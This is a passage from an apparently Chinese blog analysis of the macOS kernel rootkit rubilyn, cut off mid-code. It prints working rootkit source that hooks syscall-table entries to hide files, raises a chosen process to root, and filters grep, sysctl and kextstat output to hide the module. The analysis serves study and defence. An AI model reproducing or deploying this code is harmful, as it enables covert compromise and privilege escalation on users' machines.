&lt;p&gt;下面是rubilyn中对系统调用函数getdirentries64 和 getdirentriesattr的挂钩代码，将这两个函数替换为自定义的 new_getdirentries64  和 new_getdirentriesattr ，同时保存原函数地址方便获取目录信息并进行篡改：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(nsysent)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    table = find_sysent();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(table)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* back up original syscall pointers */&lt;/span&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        org_getdirentries64 = (void *) table[SYS_getdirentries64].sy_call; 	&lt;span class=&quot;comment&quot;&gt;// 保存原系统函数地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        org_getdirentriesattr = (void *) table[SYS_getdirentriesattr].sy_call; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* replace syscalls in syscall table */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        table[SYS_getdirentries64].sy_call = (void *) new_getdirentries64;	&lt;span class=&quot;comment&quot;&gt;// 替换原系统函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        table[SYS_getdirentriesattr].sy_call = (void *) new_getdirentriesattr;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;两个替换函数执行的操作有点类似，主要是移除指定文件的dirent结构，其中dirent结构原型如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; dirent &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;__uint32_t&lt;/span&gt; d_fileno; 	&lt;span class=&quot;comment&quot;&gt;// 节点号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;__uint16_t&lt;/span&gt; d_reclen;	&lt;span class=&quot;comment&quot;&gt;// 目录项长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;__uint8_t&lt;/span&gt;  d_type;	&lt;span class=&quot;comment&quot;&gt;// 文件类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;__uint8_t&lt;/span&gt;  d_namlen;	&lt;span class=&quot;comment&quot;&gt;// 文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;if&lt;/span&gt; __BSD_VISIBLE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAXNAMLEN 255&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; d_name[MAXNAMLEN+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]; &lt;span class=&quot;comment&quot;&gt;// 文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; d_name[&lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];	&lt;span class=&quot;comment&quot;&gt;// 文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此处我们只看下 new_getdirentries64 函数，&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* hooked getdirentries64 and friends */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;register_t&lt;/span&gt; new_getdirentries64(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc *p, &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; getdirentries64_args *uap, &lt;span class=&quot;keyword&quot;&gt;user_ssize_t&lt;/span&gt; *retval)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; ret; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;u_int64_t&lt;/span&gt; bcount = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;u_int64_t&lt;/span&gt; btot = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;size_t&lt;/span&gt; buffersize = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; direntry *dirp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *mem = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; updated = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ret = org_getdirentries64(p,uap,retval); &lt;span class=&quot;comment&quot;&gt;// 调用原函数获取目录信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    btot = buffersize = bcount = *retval;    &lt;span class=&quot;comment&quot;&gt;// 函数返回的字节数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(bcount &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        MALLOC(mem,&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *,bcount,M_TEMP,M_WAITOK);  &lt;span class=&quot;comment&quot;&gt;// 在内核空间分配bcount大小的内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(mem == &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return(ret); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        copyin(uap-&amp;gt;buf, mem, bcount);  &lt;span class=&quot;comment&quot;&gt;// 将用户空间数据拷贝到刚分配的内核空间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        dirp = mem;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(bcount &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; dirp-&amp;gt;d_reclen &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(dirp-&amp;gt;d_reclen &amp;gt; &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;comment&quot;&gt;// 搜索指定文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(dirp-&amp;gt;d_name,(char*)&amp;amp;k_dir,strlen((char*)&amp;amp;k_dir)) == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *next = (char *) dirp + dirp-&amp;gt;d_reclen;    &lt;span class=&quot;comment&quot;&gt;// 下一目录项&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;u_int64_t&lt;/span&gt; offset = (char *) next - (char *) mem ;	&lt;span class=&quot;comment&quot;&gt;// 当前文件目录项大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    bcount -= dirp-&amp;gt;d_reclen;   &lt;span class=&quot;comment&quot;&gt;// 递减字节数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    btot -= dirp-&amp;gt;d_reclen;     &lt;span class=&quot;comment&quot;&gt;// 递减目录项长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    bcopy(next,dirp,buffersize - offset);   &lt;span class=&quot;comment&quot;&gt;// 覆盖指定文件的目录项，从而实现文件隐藏&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    updated = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            bcount -= dirp-&amp;gt;d_reclen;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            dirp = (struct direntry *) ((char *) dirp + dirp-&amp;gt;d_reclen);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(updated == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            copyout(mem,uap-&amp;gt;buf,btot);     &lt;span class=&quot;comment&quot;&gt;// 将修改后的数据返回给用户空间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            *retval = btot; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        FREE(mem,M_TEMP);   &lt;span class=&quot;comment&quot;&gt;// 释放内核内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;3、设置Root进程&quot;&gt;&lt;a href=&quot;#3、设置Root进程&quot; class=&quot;headerlink&quot; title=&quot;3、设置Root进程&quot;&gt;&lt;/a&gt;3、设置Root进程&lt;/h3&gt;&lt;p&gt;先通过pid获取进程proc结构，然后更改其中进程属主字段p_ucred为0，即root属主。源代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;getroot&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; pid)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc *rootpid;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;kauth_cred_t&lt;/span&gt; creds;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    rootpid = proc_find(pid);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!rootpid)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    lck_mtx_lock((&lt;span class=&quot;keyword&quot;&gt;lck_mtx_t&lt;/span&gt;*)&amp;amp;rootpid-&amp;gt;p_mlock);    &lt;span class=&quot;comment&quot;&gt;// 设置互斥锁&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    creds = rootpid-&amp;gt;p_ucred;   &lt;span class=&quot;comment&quot;&gt;// 进程属主&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    creds = my_kauth_cred_setuidgid(rootpid-&amp;gt;p_ucred,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;// 设置进程属主id为0(root)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    rootpid-&amp;gt;p_ucred = creds;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    lck_mtx_unlock((&lt;span class=&quot;keyword&quot;&gt;lck_mtx_t&lt;/span&gt;*)&amp;amp;rootpid-&amp;gt;p_mlock);  &lt;span class=&quot;comment&quot;&gt;// 解锁&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;4、隐藏网络端口、用户名和内核模块&quot;&gt;&lt;a href=&quot;#4、隐藏网络端口、用户名和内核模块&quot; class=&quot;headerlink&quot; title=&quot;4、隐藏网络端口、用户名和内核模块&quot;&gt;&lt;/a&gt;4、隐藏网络端口、用户名和内核模块&lt;/h3&gt;&lt;p&gt;通过对write_nocancel函数挂钩，然后对 grep、sysctl、netstat、kextstat、w和who等命令的输出结果进行过滤，当命令输出结果中包含rubilyn模块名以及特写端口和用户名时就直接返回，否则就调用原始的write_nocanel函数。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* hooked write_nocancel for hiding console stuff */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;new_write_nocancel&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc* p, &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; write_nocancel_args *uap, user_ssize_t* retval)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; buffer[MAXBUFFER];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(p-&amp;gt;p_comm, grep, strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;||&lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(p-&amp;gt;p_comm, sysctl,strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;||&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(p-&amp;gt;p_comm, kextstat,strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bzero(buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        copyin(uap-&amp;gt;cbuf, buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer)&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(my_strstr(buffer, rubilyn))	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return(uap-&amp;gt;nbyte);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span 